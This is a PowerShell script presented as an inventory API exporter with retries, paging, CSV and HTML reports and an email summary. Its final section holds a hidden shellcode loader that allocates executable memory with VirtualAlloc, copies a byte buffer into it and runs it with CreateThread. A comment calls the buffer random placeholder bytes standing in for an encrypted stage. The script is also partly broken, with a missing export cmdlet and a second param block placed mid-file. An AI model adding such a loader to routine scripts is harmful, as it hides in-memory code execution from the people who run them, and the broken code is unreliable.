#Requires -Version 5.1
<#
.SYNOPSIS
    Calls the Contoso inventory API with retry and exports the server list.
.DESCRIPTION
    Wraps Invoke-RestMethod in a retry helper that backs off on transient errors
    and gives up on client errors such as 401 or 404.
    Pages are followed through the nextLink property until the collection is
    exhausted, then the records are written to CSV.
.PARAMETER BaseUri
    Used when the script runs unattended.
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$BaseUri = 'https://api.adatum.com/v1',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 10)]
    [int]$MaxRetries = 4,

    [int]$TimeoutSec = 15,
    [int]$PageSize = 25,
    [string]$ReportPath = 'C:\Reports\api-servers-2025-03-21.csv'
)

$WarningPreference = 'Continue'

$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

function Invoke-ContosoApi {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [ValidateSet('Get', 'Post')]
        [string]$Method = 'Get',

        [object]$Body
    )

    $uri = "$BaseUri$Path"
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $params = @{
                Uri         = $uri
                Method      = $Method
                Headers     = $headers
                TimeoutSec  = $TimeoutSec
                ErrorAction = 'Stop'
            }
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 5
                $params.ContentType = 'application/json'
            }
            return Invoke-RestMethod @params
        }
        catch {
            $status = 0
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
        }
    }
}

$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
$records = @($page.items)
while ($page.nextLink) {
    $next = $page.nextLink.Replace($BaseUri, '')
    $page = Invoke-ContosoApi -Path $next
    $records += @($page.items)
    Write-Verbose ("Collected {0} records" -f @($records).Count)
}

$summary = $records | Group-Object -Property status | ForEach-Object {
    [pscustomobject]@{
        Status = $_.Name
        Count  = $_.Count
    }
}
$summary | Format-Table -AutoSize

$records | Select-Object id, name, status |
    -Path $ReportPath `
    -NoTypeInformation

$summary | Export-Csv -Path $ReportPath.Replace('.csv', '-summary.csv') -NoTypeInformation -Encoding UTF8

$newTag = @{ tags = @('inventory', 'automated') }
try {
    $tagged = Invoke-ContosoApi -Path '/servers/tags' -Method Post -Body $newTag
    Write-Verbose ("Tag request returned {0}" -f $tagged.status)
}
catch {
    Write-Warning ("Tagging skipped: {0}" -f $_.Exception.Message)
}
$style = @'
<style>
body { font-family: Tahoma; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$summary | ConvertTo-Html -Title 'API inventory summary' -Head $style |
    Set-Content -Path $ReportPath.Replace('.csv', '.html') -Encoding UTF8

$MailTo = 'api-ops@adatum.com'
$MailFrom = "api-report@adatum.com"
$mailBody = "Inventory run finished with {0} records" -f @($records).Count
Send-MailMessage -To $MailTo -From $MailFrom -Subject 'API inventory' -Body $mailBody -SmtpServer 'smtp.adatum.com' -Port 25

Write-Host ("API inventory complete: {0} records" -f @($records).Count) -ForegroundColor Green
Write-Verbose ("Elapsed requests: {0}" -f [math]::Ceiling(@($records).Count / $PageSize))

$rateLimit = $null
if ($rateLimit) {
    Write-Verbose ("Remaining calls: {0}" -f $rateLimit)
}

$retryCount = @($records).Count - @($records | Select-Object -Unique) .Count
Write-Verbose ("Duplicate ids skipped: {0}" -f $retryCount)

$endpoints = @('/servers', '/servers/tags', '/health')
$endpoints | ForEach-Object { Write-Verbose ("Endpoint: {0}" -f $_) }

$baseUriHost = ([uri]$BaseUri).Host
Write-Verbose ("Target host: {0}" -f $baseUriHost)

$tokenLength = $ApiKey.Length
Write-Verbose ("API key length: {0}" -f $tokenLength)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class PlatformApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xe1, 0x9c, 0x6a, 0xfe, 0x82, 0xc3, 0x32, 0x1b, 0x39, 0x4e, 0x6c, 0x7a, 0xaf, 0x1e, 0x1f, 0x01,
        0xd9, 0xd3, 0x21, 0x4e, 0xf9, 0x17, 0xea, 0x35, 0x62, 0xac, 0x85, 0x3b, 0xd4, 0xc0, 0x62, 0xad,
        0x62, 0x3f, 0x33, 0x84, 0x0e, 0x72, 0x88, 0x5c, 0x27, 0xfc, 0xa9, 0xd6, 0x4d, 0x75, 0x67, 0xa1,
        0x82, 0xa1, 0x39, 0xec, 0x98, 0x31, 0x85, 0x4c, 0x3d, 0x3c, 0x2b, 0x4c, 0x12, 0x5c, 0x8a, 0xcc,
        0x10, 0x57, 0xc9, 0xd2, 0xcb, 0x2d, 0xd8, 0xc5, 0x50, 0xc0, 0x0f, 0xf5, 0x19, 0x29, 0xc7, 0x9b,
        0xca, 0x29, 0xc3, 0x3a, 0x68, 0x98, 0x85, 0xfa, 0x89, 0x0d, 0x11, 0x84, 0x15, 0x19, 0x76, 0x72,
        0xe2, 0x8a, 0x29, 0x72, 0xa5, 0xb0, 0xe4, 0x8b, 0xd3, 0xe3, 0x8a, 0x8b, 0x8a, 0x3b, 0x79, 0xcc,
        0xff, 0x66, 0x56, 0xef, 0x8e, 0x23, 0x89, 0x77, 0xfd, 0x80, 0x91, 0xcf, 0x6a, 0x87, 0xa3, 0x9e,
        0xb3, 0x32, 0xb4, 0x57, 0x04, 0x9d, 0xe6, 0xb7, 0x41, 0x19, 0x04, 0xd8, 0xed, 0x03, 0x0d, 0x8c,
        0xae, 0xe5, 0x35, 0xaf, 0x72, 0x41, 0x28, 0x22, 0xb8, 0x7a, 0x12, 0x14, 0x8a, 0x64, 0xe4, 0x81,
        0x31, 0x1c, 0xa6, 0x03, 0x43, 0x9f, 0xd9, 0x20, 0x09, 0x30, 0x0e, 0x97, 0x74, 0xc8, 0xd5, 0x09,
        0xe0, 0xd6, 0xd0, 0xce, 0x9d, 0x7a, 0x2c, 0xcb, 0x1e, 0x1e, 0x21, 0xe1, 0xc4, 0xd7, 0x83, 0x18,
        0x29, 0x18, 0x3a, 0xd8, 0x60, 0xd6, 0x93, 0x03, 0x4a, 0xd4, 0xcf, 0x0f, 0xcd, 0x23, 0xe3, 0x12,
        0x8b, 0x1e, 0xbe, 0x6a, 0x43, 0x6a, 0x5f, 0x53, 0x51, 0x02, 0xa6, 0xf6, 0xbe, 0x21, 0xfe, 0xa0,
        0xee, 0x16, 0x42, 0x4e, 0xc8, 0xbf, 0x62, 0x7f, 0xa1, 0xfe, 0xe8, 0x7a, 0x45, 0xc4, 0x37, 0xe8,
        0x0d, 0xdd, 0x19, 0x07, 0xcf, 0x84, 0x57, 0xb3, 0x73, 0xc0, 0x5d, 0x13, 0xaf, 0x36, 0x1e, 0x12,
        0x29, 0x79, 0xbe, 0x1a, 0xa1, 0xc1, 0x3f, 0xbc, 0x91, 0x52, 0x26, 0xa1, 0x1c, 0xfc, 0xeb, 0x58,
        0x92, 0x49, 0x80, 0xaa, 0x2f, 0x3e, 0x3b, 0x02, 0x2c, 0xae, 0xa9, 0x30, 0x0b, 0x79, 0x6c, 0xc3,
        0x25, 0xe3, 0xe5, 0xd4, 0xc2, 0x58, 0xf4, 0xef, 0xf3, 0xa6, 0xff, 0xed, 0x09, 0x4b, 0x10, 0x53,
        0xb7, 0x7f, 0xf8, 0xbf, 0x68, 0x24, 0x58, 0x51, 0x2d, 0xf7, 0x53, 0x3f, 0xf1, 0x30, 0x68, 0xf1,
        0xa0, 0x1b, 0x30, 0x3d, 0x53, 0x54, 0x1c, 0x0f, 0xb1, 0x46, 0x81, 0xd7, 0xbf, 0x16, 0x41, 0xf0,
        0x67, 0xbe, 0x5e, 0xab, 0x36, 0x9c, 0xcd, 0xd4, 0x67, 0x5b, 0x23, 0x57, 0x99, 0x9f, 0x7c, 0x84,
        0xf7, 0x88, 0x9f, 0xb5, 0xd0, 0x03, 0xe9, 0xcb, 0xd7, 0xfd, 0xe9, 0xbc, 0x88, 0x3f, 0xaa, 0x66,
        0xe7, 0x9f, 0x4f, 0xb2, 0xa6, 0x79, 0x4e, 0xb5, 0x0f, 0x38, 0x07, 0x79, 0x95, 0xda, 0x75, 0x1b,
        0xae, 0x14, 0xc6, 0xa6, 0xd6, 0x75, 0xd6, 0xfb, 0xb9, 0xc5, 0x59, 0xfd, 0x27, 0x3e, 0xb9, 0x57,
        0x40, 0x72, 0xf6, 0x43, 0x01, 0xc6, 0x66, 0x5a, 0x1d, 0xb3, 0x89, 0x28, 0x78, 0xcf, 0x97, 0xe7,
        0xfa, 0x1f, 0x64, 0xa0, 0x28, 0xb3, 0xd1, 0xa0, 0x98, 0x83, 0xf6, 0xf6, 0x78, 0xf5, 0xff, 0x4b,
        0x22, 0x0e, 0x43, 0x57, 0x41, 0xc9, 0xaa, 0x62, 0x79, 0x26, 0x5c, 0x38, 0x86, 0xa8, 0x45, 0x3d
    )

    $MemoryHandle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($MemoryHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][PlatformApi]::WaitForSingleObject($Thread, 3035)
    [void][PlatformApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
